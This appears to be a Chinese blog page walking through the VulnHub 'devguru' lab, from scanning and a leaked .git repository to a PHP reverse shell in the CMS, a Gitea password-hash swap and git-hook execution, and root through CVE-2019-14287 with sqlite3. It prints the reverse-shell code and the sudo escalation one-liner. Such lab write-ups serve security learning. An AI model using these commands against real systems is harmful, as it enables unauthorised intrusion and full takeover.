@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="靶场实战：devguru 靶机地址devguru 信息收集常规扫描 sudo nmap 192.168.1.0&#x2F;24 -sn靶机发现192.168.1.138  sudo nmap $ip -p- --min-rate&#x3D;10000端口扫描22,80,8585  sudo nmap $ip -p$ports -sT -sC -sV -O -oA devguru&#x2F;detail细节扫描，tcp协议扫描对">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶场实战：devguru">
+<meta property="og:url" content="https://ta3shi.github.io/1970/01/01/devguru/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="靶场实战：devguru 靶机地址devguru 信息收集常规扫描 sudo nmap 192.168.1.0&#x2F;24 -sn靶机发现192.168.1.138  sudo nmap $ip -p- --min-rate&#x3D;10000端口扫描22,80,8585  sudo nmap $ip -p$ports -sT -sC -sV -O -oA devguru&#x2F;detail细节扫描，tcp协议扫描对">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278830305.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278873458.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278893053.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278903236.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278926588.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278960600.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278981133.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279056940.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279073567.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279098699.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279119471.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279130337.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279147662.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279163760.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279178588.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279195376.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279207508.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279217041.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279262092.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279271344.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279287060.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279380648.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279429126.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279453993.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279463974.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279479812.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279489723.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279496031.png">
+<meta property="article:published_time" content="1970-01-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-03T16:06:34.250Z">
+<meta property="article:author" content="ta3shi">
+<meta property="article:tag" content="linux提权,web渗透,vulnhub靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278830305.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>靶场实战：devguru</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/1970/01/01/devguru/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/1970/01/01/devguru/&text=靶场实战：devguru"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/1970/01/01/devguru/&title=靶场实战：devguru"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/1970/01/01/devguru/&is_video=false&description=靶场实战：devguru"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶场实战：devguru&body=Check out this article: https://ta3shi.github.io/1970/01/01/devguru/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/1970/01/01/devguru/&title=靶场实战：devguru"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/1970/01/01/devguru/&title=靶场实战：devguru"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/1970/01/01/devguru/&title=靶场实战：devguru"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/1970/01/01/devguru/&title=靶场实战：devguru"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/1970/01/01/devguru/&name=靶场实战：devguru&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/1970/01/01/devguru/&t=靶场实战：devguru"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">开始渗透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E9%AB%98%E4%BA%A4%E4%BA%92shell"><span class="toc-number">3.1.</span> <span class="toc-text">获取高交互shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7"><span class="toc-number">3.2.</span> <span class="toc-text">获取普通用户</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlite3%E9%85%8D%E5%90%88sudo%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">sqlite3配合sudo漏洞提权</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        靶场实战：devguru
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ta3shi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="1970-01-01T00:00:00.000Z" class="dt-published" itemprop="datePublished">1970-01-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/ctf-study-%E6%97%A5%E8%AE%B0-2025-05/">/ctf study/日记/2025-05</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/linux%E6%8F%90%E6%9D%83-web%E6%B8%97%E9%80%8F-vulnhub%E9%9D%B6%E5%9C%BA/" rel="tag">linux提权,web渗透,vulnhub靶场</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>靶场实战：devguru</p>
+<p>靶机地址<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/devguru-1,620/">devguru</a></p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>常规扫描</p>
+<p><code>sudo nmap 192.168.1.0/24 -sn</code>靶机发现192.168.1.138</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278830305.png"></p>
+<p><code>sudo nmap $ip -p- --min-rate=10000</code>端口扫描22,80,8585</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278873458.png"></p>
+<p><code>sudo nmap $ip -p$ports -sT -sC -sV -O -oA devguru/detail</code>细节扫描，tcp协议扫描对应端口，-sC使用默认脚本，-SV扫描版本信息，-O确定操作系统，-oA格式化输出</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278893053.png"></p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278903236.png"></p>
+<p>80端口存在git泄露，8585端口运行了gitea</p>
+<p><code>sudo nmap -sU --top-ports 20 $ip -oA devguru/udp</code>扫描udp的常见端口，有时可以多指定一些端口</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278926588.png" alt="enter description here"></p>
+<p>目录扫描，有时一个工具没有收获可以多试试几个工具（如dirb，dirsearch，gobuster等）</p>
+<p>80端口目录</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278960600.png"></p>
+<p>8585端口的目录</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278981133.png" alt="enter description here"></p>
+<h4 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h4><p>80端口存在git泄露，使用githack工具下载下来</p>
+<p><code>sudo python GitHack.py http://192.168.1.138</code></p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279056940.png"></p>
+<p>重点查看配置相关文件</p>
+<p>config下的database.php发现数据库信息</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279073567.png"></p>
+<p>访问80端口的adminer.php发现是数据库管理</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279098699.png"></p>
+<p>使用刚刚获取的信息登录</p>
+<p>优先关注users等信息，只找到一个backend_users的表，此时有两个思路，1修改原来管理员的密码，危险程度较高，容易被发现，2是新建一个用户，危险程度较低，这里选择新建用户<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279119471.png" alt="enter description here"></p>
+<p>最后is_superuser要设置为1，在用户组将我们新建的用户归类到管理员组</p>
+<p>同时根据数据库加上80端口扫描的目录backend,访问并登录</p>
+<p>登录之后在cms -add - code输入反弹shell的指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function onStart()&#123;</span><br><span class="line">//nc监听7777端口</span><br><span class="line">    $s   =fsockopen(&quot;192.168.1.114&quot;,5555);</span><br><span class="line">    $proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279130337.png"></p>
+<p>同时开启本地监听<code>nc -lvvp 5555</code></p>
+<p>访问&#x2F;home1（新建网页名称）执行代码获取shell</p>
+<p>成功拿到shell<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279147662.png"></p>
+<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><h5 id="获取高交互shell"><a href="#获取高交互shell" class="headerlink" title="获取高交互shell"></a>获取高交互shell</h5><p>使用<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>获得交互更好的shell（使用什么版本的python主要看环境有什么版本）</p>
+<p>读取&#x2F;etc&#x2F;passwd文件发现只有root和frank用户有&#x2F;bin&#x2F;bash即允许ssh且有高交互shell</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279163760.png"></p>
+<p>尝试读取shadow文件权限不允许，通常shadow文件都是只有root用户有权限的，但是也不一定，如果可以读取就可以利用该文件进行hash碰撞</p>
+<p>使用python启动一个快速http服务共享文件<code>python -m http.server</code></p>
+<p>使用wget下载linpeas.sh和LinEnum.sh</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279178588.png"></p>
+<p>提升权限并运行脚本</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279195376.png"></p>
+<p>suid不存在提权，看看sudo，需要密码，无法获得</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279207508.png"></p>
+<p>查看备份文件<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279217041.png"></p>
+<h5 id="获取普通用户"><a href="#获取普通用户" class="headerlink" title="获取普通用户"></a>获取普通用户</h5><p>发现新的服务器连接<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279262092.png" alt="enter description here"></p>
+<p>同样查看user，因为我们已经获取了web的权限，因此这里我们想要获取frank用户的权限，所以这里的选择是更改frank的密码<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279271344.png" alt="enter description here"></p>
+<p>原来的gitea的加密方式是pbkdf2且有salt，我们选择换一个加密方式，bcrypt，使用网站实现（我这里尝试了几种方式，只有bcrypt可行，有的博客使用了原加密方式，但没说清楚salt值的获取）<a target="_blank" rel="noopener" href="https://www.bejson.com/encrypt/bcrpyt_encode/#google_vignette">在线Bcrypt密码生成工具-Bejson.com</a></p>
+<p><code>$2a$10$sV1DF9po/5T1BE2dsy2OueGZ/VuPrUrwDR6aA88Ygu2gv6GPeGtzO</code></p>
+<p>结合目录扫描的结构gitea在8585端口<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279287060.png" alt="enter description here"></p>
+<p>左下角显示gitea的版本是1.12.5</p>
+<p>该版本存在以下漏洞</p>
+<p>setting -&gt; git hook输入命令</p>
+<p>然后编辑 readme.md 随便编辑即可执行<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279380648.png" alt="enter description here"></p>
+<p>成功拿到<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279429126.png"></p>
+<p>存在sqlite3无需密码使用<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279453993.png" alt="enter description here"></p>
+<h4 id="sqlite3配合sudo漏洞提权"><a href="#sqlite3配合sudo漏洞提权" class="headerlink" title="sqlite3配合sudo漏洞提权"></a>sqlite3配合sudo漏洞提权</h4><p>发现特权命令&#x2F;usr&#x2F;bin&#x2F;sqlite3使用网站查找<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a></p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279463974.png"></p>
+<p>复制，执行，发现</p>
+<p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279479812.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279489723.png"></p>
+<p>sudo的版本是1.8.21，存在一个<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/217089.html">CVE-2019-14287：sudo权限绕过漏洞分析与复现 - FreeBuf网络安全行业门户</a>的漏洞</p>
+<p>这里可以使用该漏洞配合sqlite3提权</p>
+<p><code>sudo -u#-1 sqlite3 /dev/null &#39;.shell /bin/sh&#39;</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279496031.png" alt="enter description here"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">开始渗透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E9%AB%98%E4%BA%A4%E4%BA%92shell"><span class="toc-number">3.1.</span> <span class="toc-text">获取高交互shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7"><span class="toc-number">3.2.</span> <span class="toc-text">获取普通用户</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlite3%E9%85%8D%E5%90%88sudo%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">sqlite3配合sudo漏洞提权</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ta3shi.github.io/1970/01/01/devguru/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/1970/01/01/devguru/&text=靶场实战：devguru"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/1970/01/01/devguru/&title=靶场实战：devguru"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/1970/01/01/devguru/&is_video=false&description=靶场实战：devguru"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶场实战：devguru&body=Check out this article: https://ta3shi.github.io/1970/01/01/devguru/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/1970/01/01/devguru/&title=靶场实战：devguru"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/1970/01/01/devguru/&title=靶场实战：devguru"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/1970/01/01/devguru/&title=靶场实战：devguru"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/1970/01/01/devguru/&title=靶场实战：devguru"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/1970/01/01/devguru/&name=靶场实战：devguru&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/1970/01/01/devguru/&t=靶场实战：devguru"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    ta3shi
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
